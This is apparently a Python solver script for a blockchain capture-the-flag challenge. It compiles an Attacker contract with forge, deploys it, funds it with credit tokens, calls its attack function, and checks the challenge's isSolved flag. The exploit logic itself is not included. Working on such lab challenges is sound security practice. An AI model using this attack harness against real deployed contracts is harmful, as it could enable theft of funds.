import json
import os
import subprocess
from pathlib import Path

from web3 import Web3


SOLVER_ROOT = Path(__file__).resolve().parent

SETUP_ABI = [
    {
        "inputs": [],
        "name": "credit",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]
CREDIT_ABI = [
    {
        "inputs": [{"type": "address"}, {"type": "uint256"}],
        "name": "transfer",
        "outputs": [{"type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function",
    }
]

def build_transaction(transaction_builder, player_address):
    return transaction_builder.build_transaction(
        {
            "from": player_address,
            "gas": 6_000_000,
        }
    )


def send_transaction(w3, player, transaction):
    transaction.update(
        {
            "from": player.address,
            "nonce": w3.eth.get_transaction_count(player.address),
            "chainId": w3.eth.chain_id,
        }
    )
    transaction.setdefault("gas", 6_000_000)

    latest_block = w3.eth.get_block("latest")
    base_fee = latest_block.get("baseFeePerGas")
    if base_fee is None:
        transaction.setdefault("gasPrice", w3.eth.gas_price)
    else:
        priority_fee = w3.to_wei(1, "gwei")
        transaction.setdefault("maxPriorityFeePerGas", priority_fee)
        transaction.setdefault("maxFeePerGas", base_fee * 2 + priority_fee)
        transaction.pop("gasPrice", None)

    signed = player.sign_transaction(transaction)
    transaction_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    if receipt.status != 1:
        raise RuntimeError(f"transaction reverted: {transaction_hash.hex()}")
    return receipt


def load_attacker_artifact():
    subprocess.run(
        ["forge", "build", "--root", str(SOLVER_ROOT)],
        check=True,
    )
    artifact_path = SOLVER_ROOT / "out/Attacker.sol/Attacker.json"
    artifact = json.loads(artifact_path.read_text(encoding="utf-8"))
    return artifact["abi"], artifact["bytecode"]["object"]


def main():
    rpc_url = os.environ["RPC_URL"]
    private_key = os.getenv("PRIVATE_KEY") or os.environ["PRIVKEY"]
    setup_address = Web3.to_checksum_address(
        os.getenv("SETUP_ADDRESS") or os.environ["SETUP_CONTRACT_ADDR"]
    )
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    player = w3.eth.account.from_key(private_key)

    if not w3.is_connected():
        raise SystemExit("RPC endpoint is not reachable")

    setup = w3.eth.contract(address=setup_address, abi=SETUP_ABI)
    credit = w3.eth.contract(
        address=setup.functions.credit().call(),
        abi=CREDIT_ABI,
    )
    attacker_abi, attacker_bytecode = load_attacker_artifact()

    attacker_factory = w3.eth.contract(
        abi=attacker_abi,
        bytecode=attacker_bytecode,
    )
    deploy_receipt = send_transaction(
        w3,
        player,
        build_transaction(
            attacker_factory.constructor(setup_address),
            player.address,
        ),
    )
    attacker = w3.eth.contract(
        address=deploy_receipt.contractAddress,
        abi=attacker_abi,
    )

    send_transaction(
        w3,
        player,
        build_transaction(
            credit.functions.transfer(
                attacker.address,
                10_000 * 10**18,
            ),
            player.address,
        ),
    )
    attack_receipt = send_transaction(
        w3,
        player,
        build_transaction(
            attacker.functions.attack(),
            player.address,
        ),
    )

    solved = setup.functions.isSolved().call()
    print(f"Player: {player.address}")
    print(f"Attacker: {attacker.address}")
    print(f"Attack transaction: {attack_receipt.transactionHash.hex()}")
    print(f"Solved: {solved}")
    if not solved:
        raise SystemExit("challenge is not solved")


if __name__ == "__main__":
    main()
